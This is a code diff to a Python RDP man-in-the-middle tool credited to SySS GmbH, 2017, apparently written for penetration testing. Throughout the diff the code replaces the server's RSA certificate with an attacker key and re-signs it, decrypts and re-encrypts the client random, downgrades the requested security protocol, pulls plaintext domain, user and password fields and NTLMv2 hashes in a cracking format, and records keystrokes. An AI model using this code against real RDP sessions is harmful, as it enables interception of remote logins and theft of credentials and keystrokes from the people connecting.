@@ -13,7 +13,7 @@ Adrian Vollmer, SySS GmbH 2017
 import argparse
 import socket
 import ssl
-import binascii
+from binascii import hexlify
 import re
 from hexdump import hexdump
 import select
@@ -99,9 +99,9 @@ def extract_ntlmv2(bytes, m):
     return b"%s::%s:%s:%s:%s" % (
                  values["user"],
                  values["domain"],
-                 binascii.hexlify(server_challenge),
-                 binascii.hexlify(nt_response),
-                 binascii.hexlify(jtr_string),
+                 hexlify(server_challenge),
+                 hexlify(nt_response),
+                 hexlify(jtr_string),
          )
 
 
@@ -109,12 +109,12 @@ def extract_server_challenge(bytes, m):
     offset = len(m.group())//2+12
     global server_challenge
     server_challenge = bytes[offset:offset+8]
-    return b"Server challenge: " + binascii.hexlify(server_challenge)
+    return b"Server challenge: " + hexlify(server_challenge)
 
 
 def extract_server_cert(bytes):
     # Reference: [MS-RDPBCGR].pdf from 2010, v20100305
-    m2 = re.match(b".*010c.*030c.*020c", binascii.hexlify(bytes))
+    m2 = re.match(b".*010c.*030c.*020c", hexlify(bytes))
     offset = len(m2.group())//2
     size = struct.unpack('<H', substr(bytes, offset, 2))[0]
     encryption_method = struct.unpack('<I', substr(bytes, offset+2, 4))[0]
@@ -163,7 +163,8 @@ def extract_server_cert(bytes):
                      "server_rand": server_random, # little endian
                      "sign": sign,
                      "first5fields": first5fields,
-                     "client_rand_seen": b"",
+                     "pubkey_blob": pubkey,
+                     "client_rand": b"",
                     }
     original_crypto["pubkey"] = rsa.PublicKey(
         int.from_bytes(modulus, "little"),
@@ -171,42 +172,59 @@ def extract_server_cert(bytes):
     )
     #  print(original_crypto)
 
-    return (b"Server cert modulus: " + binascii.hexlify(modulus) +
-            b"\nSignature: " + binascii.hexlify(sign) )
+    return (b"Server cert modulus: " + hexlify(modulus) +
+            b"\nSignature: " + hexlify(sign) +
+            b"\nServer random: " + hexlify(server_random) )
 
 
 def extract_client_random(bytes):
+    #  with open("data/client_rand.bytes", 'rb') as f:
+        #  bytes = f.read()
     global original_crypto
-    if original_crypto["client_rand_seen"] == b"":
-        client_rand = b""
-        client_rand = rsa_decrypt(client_rand)
-        original_crypto["client_rand_seen"] = client_rand
-
-        return(b"Client random: " + client_rand)
+    global my_keys
+    for i in range(7,len(bytes)):
+        rand_len = bytes[i:i+4]
+        if struct.unpack('<I', rand_len)[0] == len(bytes)-i-4:
+            client_rand = bytes[i+4:]
+            original_crypto["enc_client_rand"] = client_rand
+            client_rand = rsa_decrypt(client_rand, my_keys["privkey"])
+            original_crypto["client_rand"] = client_rand
+            return(b"Client random: " + hexlify(client_rand))
     return b""
 
 
+def reencrypt_client_random(bytes):
+    """Replace the original encrypted client random (encrypted with OUR
+    public key) with the client random encrypted with the original public
+    key"""
+
+    reenc_client_rand = rsa_encrypt(original_crypto["client_rand"],
+                                    original_crypto["pubkey"]) + b"\x00"*8
+    result = bytes.replace(original_crypto["enc_client_rand"],
+                           reenc_client_rand)
+    return result
+
+
+def rsa_encrypt(bytes, key):
+    r = int.from_bytes(bytes, "little")
+    e = key.e
+    n = key.n
+    c = pow(r, e, n)
+    print(key, r, c)
+    return c.to_bytes(2048, "little").rstrip(b"\x00")
+
+
+def rsa_decrypt(bytes, key):
+    s = int.from_bytes(bytes, "little")
+    d = key.d
+    n = key.n
+    m = pow(s, d, n)
+    return m.to_bytes(2048, "little").rstrip(b"\x00")
+
 
 def extract_credentials(bytes, m):
-#  00000000: 03 00 01 71 02 F0 80 64  00 08 03 EB 70 81 62 40  ...q...d....p.b@
-#  00000010: 00 00 00 07 04 07 04 BB  47 01 00 08 00 0A 00 12  ........G.......
-#  00000020: 00 00 00 00 00 52 00 44  00 31 00 34 00 00 00 55  .....R.D.1.4...U
-#  00000030: 00 73 00 65 00 72 00 31  00 00 00 50 00 61 00 73  .s.e.r.1...P.a.s
-#  00000040: 00 73 00 77 00 6F 00 72  00 74 00 31 00 00 00 00  .s.w.o.r.t.1....
-#
-#  00000000: 03 00 01 7D 02 F0 80 64  00 08 03 EB 70 81 6E 40  ...}...d....p.n@
-#  00000010: 00 00 00 00 00 00 00 3B  01 00 00 08 00 12 00 24  .......;.......$
-#  00000020: 00 00 00 00 00 72 00 64  00 31 00 34 00 00 00 44  .....r.d.1.4...D
-#  00000030: 00 6F 00 6D 00 41 00 64  00 6D 00 69 00 6E 00 31  .o.m.A.d.m.i.n.1
-#  00000040: 00 00 00 44 00 6F 00 6D  00 41 00 64 00 6D 00 69  ...D.o.m.A.d.m.i
-#  00000050: 00 6E 00 2D 00 50 00 61  00 73 00 73 00 77 00 6F  .n.-.P.a.s.s.w.o
-#  00000060: 00 72 00 74 00 31 00 00  00 00 00 00 00 02 00 18  .r.t.1..........
-#
-#  00000000: 03 00 01 53 02 F0 80 64  00 07 03 EB 70 81 44 40  ...S...d....p.D@
-#  00000010: 00 00 00 00 00 00 00 3B  01 00 00 08 00 08 00 08  .......;........
-#  00000020: 00 00 00 00 00 74 00 65  00 73 00 74 00 00 00 74  .....t.e.s.t...t
-#  00000030: 00 65 00 73 00 74 00 00  00 74 00 65 00 73 00 74  .e.s.t...t.e.s.t
-#  00000040: 00 00 00 00 00 00 00 02  00 14 00 31 00 32 00 37  ...........1.2.7
+    # Client Info PDU
+    # "0x0040 MUST be present"
     domlen, userlen, pwlen = [
         struct.unpack('>H', binascii.unhexlify(x))[0]
         for x in m.groups()
@@ -214,10 +232,27 @@ def extract_credentials(bytes, m):
     # TODO ordentlich machen
     # TODO und locale+layout holen
     offset = 36
-    domain = bytes[offset:offset+domlen]
-    user = bytes[offset+domlen+2:offset+domlen+2+userlen]
-    pw = bytes[offset+domlen+2+userlen+2:offset+domlen+2+userlen+2+pwlen]
-    return (b"%s\\%s:%s" % (domain, user, pw))
+    domain = substr(bytes, offset, domlen).encode("utf-16")
+    user = substr(bytes, offset+domlen+2, userlen).encode("utf-16")
+    pw = substr(bytes, offset+domlen+2+userlen+2, pwlen).encode("utf-16")
+    return (b"%s\\%s:%s" % (domain.decode(), user.decode(), pw.decode()))
+
+
+def extract_keyboard_layout(bytes):
+    offset = len(bytes) - 80
+    global keyboard_info
+    keyboard_info = {
+        "layout": substr(bytes, offset, 4),
+        "type": substr(bytes, offset+4, 4),
+        "subtype": substr(bytes, offset+8, 4),
+        "funckey": substr(bytes, offset+12, 4),
+    }
+    return b"Keyboard layout/type: %s/%s" % (keyboard_info["layout"],
+                                             keyboard_info["type"],)
+
+
+def translate_keycode(key):
+    return key
 
 
 def extract_key_press(bytes):
@@ -227,6 +262,7 @@ def extract_key_press(bytes):
     else:
         event = bytes[2]
         key = bytes[3]
+    key = translate_keycode(key)
     # TODO map scancode to ascii
     # get language locale and keyboard layout
     if event == 0:
@@ -239,14 +275,17 @@ def replace_server_cert(bytes):
     global original_crypto
     global my_keys
     old_sig = sign_certificate(original_crypto["first5fields"] +
-                               original_crypto["modulus"])
+                               original_crypto["pubkey_blob"])
     assert old_sig == original_crypto["sign"]
     key_len = len(original_crypto["modulus"])-8
     (pubkey, privkey) = rsa.newkeys(key_len*8)
     my_keys = {"pubkey": pubkey, "privkey": privkey}
     new_modulus = pubkey.n.to_bytes(key_len + 8, "little")
-    result = bytes.replace(original_crypto["modulus"], new_modulus)
-    new_sig = sign_certificate(original_crypto["first5fields"] + new_modulus)
+    old_modulus = original_crypto["modulus"]
+    result = bytes.replace(old_modulus, new_modulus)
+    new_pubkey_blob = original_crypto["pubkey_blob"].replace(old_modulus,
+                                                             new_modulus)
+    new_sig = sign_certificate(original_crypto["first5fields"] + new_pubkey_blob)
     result = result.replace(original_crypto["sign"], new_sig)
 
     return result
@@ -269,26 +308,44 @@ def parse_rdp(bytes):
     result = b""
     # hexlify first because \x0a is a line break and regex works on single
     # lines
-    cred_regex = b".{16}00..03eb.{6}40.{20}(.{4})(.{4})(.{4})"
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+
+    # "0x0040 MUST be present"
+    cred_regex = b".{30}40.{20}(.{4})(.{4})(.{4})"
+    m = re.match(cred_regex, hexlify(bytes))
     if m:
-        result = extract_credentials(bytes, m)
+        try:
+            result = extract_credentials(bytes, m)
+        except:
+            result = b""
         #  close();exit(0)
 
-    cred_regex = b".*%s0002000000" % binascii.hexlify(b"NTLMSSP")
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+    cred_regex = b".*%s0002000000" % hexlify(b"NTLMSSP")
+    m = re.match(cred_regex, hexlify(bytes))
     if m:
         result = extract_server_challenge(bytes, m)
 
-    cred_regex = b".*%s0003000000" % binascii.hexlify(b"NTLMSSP")
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+    cred_regex = b".*%s0003000000" % hexlify(b"NTLMSSP")
+    m = re.match(cred_regex, hexlify(bytes))
     if m:
         result = extract_ntlmv2(bytes, m)
 
-    cred_regex = b".*020c.*%s" % binascii.hexlify(b"RSA1")
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+    global original_crypto
+    if "original_crypto" in globals():
+        regex = b".{14,}01.*0{16}"
+        m = re.match(regex, hexlify(bytes))
+        if m and original_crypto["client_rand"] == b"":
+            result = extract_client_random(bytes)
+
+    cred_regex = b".*020c.*%s" % hexlify(b"RSA1")
+    m = re.match(cred_regex, hexlify(bytes))
     if m:
         result = extract_server_cert(bytes)
+
+    regex = b".*0d00.{178}0000"
+    m = re.match(regex, hexlify(bytes))
+    if m:
+        result = extract_keyboard_layout(bytes)
+
 
     keypress_regex = b"\x03\x00\x001|\x44\x04.."
     m = re.match(keypress_regex, bytes)
@@ -307,23 +364,33 @@ def parse_rdp(bytes):
 
 def tamper_data(bytes):
     result = bytes
-    cred_regex = b".*020c.*%s" % binascii.hexlify(b"RSA1")
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+
+    global original_crypto
+    if "original_crypto" in globals():
+        regex = b".{14,}01.*0{16}"
+        m = re.match(regex, hexlify(bytes))
+        if m and not original_crypto["client_rand"] == b"":
+            result = reencrypt_client_random(bytes)
+
+    regex = b".*020c.*%s" % hexlify(b"RSA1")
+    m = re.match(regex, hexlify(bytes))
     if m:
         result = replace_server_cert(bytes)
 
-    cred_regex = b".*%s..010c" % binascii.hexlify(b"McDn")
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+    regex = b".*%s..010c" % hexlify(b"McDn")
+    m = re.match(regex, hexlify(bytes))
     if m:
         result = set_fake_requested_protocol(bytes, m)
+
     if not result == bytes and args.debug:
         print("Tampered data:")
         hexdump(result)
+
     return result
 
 
 def set_fake_requested_protocol(bytes, m):
-    offset = len(m.group())//2 
+    offset = len(m.group())//2
     result = bytes[:offset+6] + chr(RDP_PROTOCOL_OLD).encode() + bytes[offset+7:]
     return result
 
@@ -337,7 +404,7 @@ def set_fake_requested_protocol(bytes, m):
 
 def downgrade_auth(bytes):
     cred_regex = b".*..00..00.{8}$"
-    m = re.match(cred_regex, binascii.hexlify(bytes))
+    m = re.match(cred_regex, hexlify(bytes))
     global RDP_PROTOCOL
     global RDP_PROTOCOL_OLD
     RDP_PROTOCOL = RDP_PROTOCOL_OLD = bytes[-4]
